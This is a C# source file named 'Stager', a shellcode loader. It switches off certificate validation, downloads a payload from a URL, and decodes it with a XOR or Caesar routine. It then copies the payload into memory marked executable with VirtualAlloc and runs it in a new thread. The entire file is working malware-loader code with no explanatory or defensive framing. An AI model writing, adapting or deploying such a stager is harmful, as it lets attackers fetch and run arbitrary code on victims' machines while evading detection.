using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Stager
{
    internal class Program
    {
        private static string url = "http://localhost:85/124a8da9-8a11-4c90-abc2-87eed0ef9c9c";
        private static string decryption = "caesar";
        private static char key = 'k';

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);
            byte[] shellcode = null;

            switch (decryption)
            {
                case "xor":
                    shellcode = xor(buf, key);
                    break;

                case "caesar":
                    shellcode = caesar(buf, key);
                    break;
                
                // not encoded
                default:
                    shellcode = buf;
                    break;
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        public static void Main(String[] args)
        {
            DownloadAndExecute();
        }

        private static byte[] xor(byte[] buf, char key)
        {
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ (byte)key));
            }

            return encoded;
        }

        private static byte[] caesar(byte[] buf, char key)
        {
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] - (byte)key) & 0xFF);
            }

            return encoded;
        }
    }
}
